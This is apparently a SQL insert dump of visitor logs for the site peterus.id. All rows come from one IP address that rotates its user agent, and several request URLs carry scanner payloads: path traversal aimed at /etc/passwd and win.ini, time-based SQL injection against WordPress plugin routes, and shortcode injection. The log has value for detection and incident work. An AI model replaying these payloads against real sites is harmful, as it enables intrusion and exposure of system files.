(254, '156.246.17.42', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50', 'https://peterus.id/index.php?attributes=%7B%22__file%22%3A%22%2Fetc%2Fpasswd%22%7D&is_frontend=true&rest_route=%2Fessential-blocks%2Fv1%2Fproducts', '2025-06-27 09:46:51', '2025-06-27 09:46:51'),
(255, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:135.0) Gecko/20100101 Firefox/135.0', 'https://peterus.id', '2025-06-27 09:47:18', '2025-06-27 09:47:18'),
(256, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14', 'https://www.peterus.id', '2025-06-27 09:49:11', '2025-06-27 09:49:11'),
(257, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1', 'https://www.peterus.id/index.php?attributes=%7B%22__file%22%3A%22%2Fetc%2Fpasswd%22%7D&is_frontend=true&rest_route=%2Fessential-blocks%2Fv1%2Fproducts', '2025-06-27 09:50:37', '2025-06-27 09:50:37'),
(258, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://peterus.id/?id=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%286%29%29%29a%29--%20-&rest_route=%2Fh5vp%2Fv1%2Fview%2F1', '2025-06-27 09:53:41', '2025-06-27 09:53:41'),
(259, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:53:49', '2025-06-27 09:53:49'),
(260, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:54:48', '2025-06-27 09:54:48'),
(261, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0', 'https://peterus.id', '2025-06-27 09:55:28', '2025-06-27 09:55:28'),
(262, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36', 'https://www.peterus.id/?id=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%286%29%29%29a%29--%20-&rest_route=%2Fh5vp%2Fv1%2Fview%2F1', '2025-06-27 09:55:32', '2025-06-27 09:55:32'),
(263, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id/?__wpdmxp=%27%5D%5B%2Fwpdm_package%5D%5Bwpdm_all_packages%5D%5Bwpdm_package%20id%3D%27', '2025-06-27 09:55:41', '2025-06-27 09:55:41'),
(264, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/127.0 Safari/537.36', 'https://peterus.id/?p=1', '2025-06-27 09:56:23', '2025-06-27 09:56:23'),
(265, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0', 'https://www.peterus.id', '2025-06-27 09:57:16', '2025-06-27 09:57:16'),
(266, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0', 'https://www.peterus.id/?__wpdmxp=%27%5D%5B%2Fwpdm_package%5D%5Bwpdm_all_packages%5D%5Bwpdm_package%20id%3D%27', '2025-06-27 09:57:16', '2025-06-27 09:57:16'),
(267, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 09:57:55', '2025-06-27 09:57:55'),
(268, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id', '2025-06-27 09:58:00', '2025-06-27 09:58:00'),
(269, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id/index.php?login=1', '2025-06-27 09:58:22', '2025-06-27 09:58:22'),
(270, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:58:40', '2025-06-27 09:58:40'),
(271, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id/?p=1', '2025-06-27 09:58:47', '2025-06-27 09:58:47'),
(272, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15', 'https://peterus.id', '2025-06-27 09:59:16', '2025-06-27 09:59:16'),
(273, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id', '2025-06-27 09:59:41', '2025-06-27 09:59:41'),
(274, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://www.peterus.id/index.php?login=1', '2025-06-27 10:01:41', '2025-06-27 10:01:41'),
(275, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id', '2025-06-27 10:02:00', '2025-06-27 10:02:00'),
(276, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id/?author_id=1&rest_route=%2Flms%2Fstm-lms%2Forder%2Fitems&user=1%29%20AND%20%28SELECT%203493%20FROM%20%28SELECT%28SLEEP%286%29%29%29sauT%29%20AND%20%283071%3D3071', '2025-06-27 10:02:27', '2025-06-27 10:02:27'),
(277, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:02:32', '2025-06-27 10:02:32'),
(278, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:02:45', '2025-06-27 10:02:45'),
(279, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.7.19', 'https://peterus.id', '2025-06-27 10:02:52', '2025-06-27 10:02:52'),
(280, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0', 'https://www.peterus.id', '2025-06-27 10:02:56', '2025-06-27 10:02:56'),
(281, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://www.peterus.id/?author_id=1&rest_route=%2Flms%2Fstm-lms%2Forder%2Fitems&user=1%29%20AND%20%28SELECT%203493%20FROM%20%28SELECT%28SLEEP%286%29%29%29sauT%29%20AND%20%283071%3D3071', '2025-06-27 10:04:16', '2025-06-27 10:04:16'),
(282, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:04:27', '2025-06-27 10:04:27'),
(283, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://peterus.id', '2025-06-27 10:04:28', '2025-06-27 10:04:28'),
(284, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:04:29', '2025-06-27 10:04:29'),
(285, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id', '2025-06-27 10:05:05', '2025-06-27 10:05:05'),
(286, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 10:06:04', '2025-06-27 10:06:04'),
(287, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:06:53', '2025-06-27 10:06:53'),
(288, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id', '2025-06-27 10:06:53', '2025-06-27 10:06:53'),
(289, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id', '2025-06-27 10:06:56', '2025-06-27 10:06:56'),
(290, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id', '2025-06-27 10:08:25', '2025-06-27 10:08:25'),
(291, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:08:52', '2025-06-27 10:08:52'),
(292, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:10:53', '2025-06-27 10:10:53'),
(293, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:11:46', '2025-06-27 10:11:46'),
(294, '156.246.17.42', 'Mozilla/5.0 (Windows NT 6.2; rv:137.0) Gecko/20100101 Firefox/137.0', 'https://peterus.id', '2025-06-27 10:11:49', '2025-06-27 10:11:49'),
(295, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:13:42', '2025-06-27 10:13:42'),
(296, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id', '2025-06-27 10:15:17', '2025-06-27 10:15:17'),
(297, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0', 'https://www.peterus.id', '2025-06-27 10:18:26', '2025-06-27 10:18:26'),
(298, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0.1 Mobile/15E148 Safari/604.1', 'https://peterus.id/index.php?noAUTO=1', '2025-06-27 10:19:00', '2025-06-27 10:19:00'),
(299, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id/?InternalDir=%2F..%2F..%2F..%2F..%2Fwindows&InternalFile=win.ini', '2025-06-27 10:21:06', '2025-06-27 10:21:06'),
(300, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0 Safari/537.36', 'https://peterus.id/?InternalDir=%5C..%5C..%5C..%5C..%5Cetc&InternalFile=passwd', '2025-06-27 10:21:09', '2025-06-27 10:21:09'),
(301, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id/index.php?noAUTO=1', '2025-06-27 10:22:05', '2025-06-27 10:22:05'),
(302, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/106.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:22:10', '2025-06-27 10:22:10'),
(303, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id/?p=1', '2025-06-27 10:22:39', '2025-06-27 10:22:39'),
(304, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/111.0 Safari/537.36', 'https://www.peterus.id/?InternalDir=%2F..%2F..%2F..%2F..%2Fwindows&InternalFile=win.ini', '2025-06-27 10:24:11', '2025-06-27 10:24:11'),
(305, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3', 'https://www.peterus.id/?InternalDir=%5C..%5C..%5C..%5C..%5Cetc&InternalFile=passwd', '2025-06-27 10:24:14', '2025-06-27 10:24:14'),
(306, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0', 'https://www.peterus.id/?p=1', '2025-06-27 10:25:07', '2025-06-27 10:25:07'),
(307, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'https://www.peterus.id', '2025-06-27 10:25:16', '2025-06-27 10:25:16'),
(308, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:27:33', '2025-06-27 10:27:33'),
(309, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'https://peterus.id', '2025-06-27 10:27:46', '2025-06-27 10:27:46'),
(310, '156.246.17.42', 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id/index.php?delegate=a%3C%22%20UNION%20SELECT%20SLEEP%286%29%3B--%20-&entryPoint=responseEntryPoint&event=1&response=accept&type=c', '2025-06-27 10:29:04', '2025-06-27 10:29:04'),
(311, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:30:09', '2025-06-27 10:30:09'),
(312, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?delegate=a%3C%22%20UNION%20SELECT%20SLEEP%286%29%3B--%20-&entryPoint=responseEntryPoint&event=1&response=accept&type=c', '2025-06-27 10:30:22', '2025-06-27 10:30:22'),
(313, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id', '2025-06-27 10:31:10', '2025-06-27 10:31:10'),
(314, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:31:22', '2025-06-27 10:31:22'),
(315, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Safari/605.1.15', 'https://peterus.id', '2025-06-27 10:34:28', '2025-06-27 10:34:28'),
(316, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0', 'https://peterus.id', '2025-06-27 10:35:23', '2025-06-27 10:35:23'),
(317, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 10:35:43', '2025-06-27 10:35:43'),
(318, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://peterus.id', '2025-06-27 10:35:47', '2025-06-27 10:35:47'),
(319, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/111.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:39:01', '2025-06-27 10:39:01'),
(320, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:39:57', '2025-06-27 10:39:57'),
(321, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id', '2025-06-27 10:40:19', '2025-06-27 10:40:19'),
(322, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 10:44:15', '2025-06-27 10:44:15'),
(323, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:45:40', '2025-06-27 10:45:40'),
(324, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17', 'https://peterus.id', '2025-06-27 10:46:36', '2025-06-27 10:46:36'),
(325, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 10:47:15', '2025-06-27 10:47:15'),
(326, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15', 'https://peterus.id', '2025-06-27 10:49:18', '2025-06-27 10:49:18'),
(327, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://peterus.id/?p=1', '2025-06-27 10:49:23', '2025-06-27 10:49:23'),
(328, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 10:49:50', '2025-06-27 10:49:50'),
(329, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 'https://peterus.id', '2025-06-27 10:50:00', '2025-06-27 10:50:00'),
(330, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 10:50:19', '2025-06-27 10:50:19'),
(331, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 10:50:57', '2025-06-27 10:50:57'),
(332, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 10:53:25', '2025-06-27 10:53:25'),
(333, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id/?p=1', '2025-06-27 10:53:37', '2025-06-27 10:53:37'),
(334, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 10:54:02', '2025-06-27 10:54:02'),
(335, '156.246.17.42', 'Mozilla/5.0  Macintosh  Intel Mac OS X 10_15_7  AppleWebKit/605.1.15  KHTML  like Gecko  Version/18.4 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 10:54:18', '2025-06-27 10:54:18'),
(336, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://peterus.id', '2025-06-27 10:59:03', '2025-06-27 10:59:03'),
(337, '156.246.17.42', 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:59:03', '2025-06-27 10:59:03'),
(338, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 10:59:05', '2025-06-27 10:59:05'),
(339, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 10:59:35', '2025-06-27 10:59:35'),
(340, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25', 'https://peterus.id', '2025-06-27 10:59:53', '2025-06-27 10:59:53'),
(341, '156.246.17.42', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27', 'https://www.peterus.id', '2025-06-27 11:00:35', '2025-06-27 11:00:35'),
(342, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:01:35', '2025-06-27 11:01:35'),
(343, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/107.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:02:00', '2025-06-27 11:02:00'),
(344, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://www.peterus.id', '2025-06-27 11:02:13', '2025-06-27 11:02:13'),
(345, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:02:32', '2025-06-27 11:02:32'),
(346, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17', 'https://www.peterus.id', '2025-06-27 11:02:32', '2025-06-27 11:02:32'),
(347, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15', 'https://peterus.id', '2025-06-27 11:02:43', '2025-06-27 11:02:43'),
(348, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:03:41', '2025-06-27 11:03:41'),
(349, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:135.0) Gecko/20100101 Firefox/135.0', 'https://peterus.id', '2025-06-27 11:04:37', '2025-06-27 11:04:37'),
(350, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:05:06', '2025-06-27 11:05:06'),
(351, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:06:00', '2025-06-27 11:06:00'),
(352, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id/?--configPath=%2Fnuclei_test%2F6048382079', '2025-06-27 11:06:00', '2025-06-27 11:06:00'),
(353, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:06:07', '2025-06-27 11:06:07'),
(354, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id', '2025-06-27 11:06:36', '2025-06-27 11:06:36'),
(355, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:06:49', '2025-06-27 11:06:49'),
(356, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://www.peterus.id/?--configPath=%2Fnuclei_test%2F6048382079', '2025-06-27 11:07:15', '2025-06-27 11:07:15'),
(357, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:08:34', '2025-06-27 11:08:34'),
(358, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15', 'https://peterus.id/?more_info=%28select%2Afrom%28select%28sleep%286%29%29%29a%29&status_code=true&wc-api=payplus_gateway', '2025-06-27 11:09:55', '2025-06-27 11:09:55'),
(359, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:09:57', '2025-06-27 11:09:57'),
(360, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id', '2025-06-27 11:10:08', '2025-06-27 11:10:08'),
(361, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', 'https://www.peterus.id/?more_info=%28select%2Afrom%28select%28sleep%286%29%29%29a%29&status_code=true&wc-api=payplus_gateway', '2025-06-27 11:10:57', '2025-06-27 11:10:57'),
(362, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id', '2025-06-27 11:12:08', '2025-06-27 11:12:08'),
(363, '156.246.17.42', 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:13:56', '2025-06-27 11:13:56'),
(364, '156.246.17.42', 'WMS/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'https://peterus.id', '2025-06-27 11:15:25', '2025-06-27 11:15:25'),
(365, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://www.peterus.id', '2025-06-27 11:15:34', '2025-06-27 11:15:34'),
(366, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0', 'https://peterus.id', '2025-06-27 11:16:02', '2025-06-27 11:16:02'),
(367, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:16:53', '2025-06-27 11:16:53'),
(368, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id', '2025-06-27 11:17:00', '2025-06-27 11:17:00'),
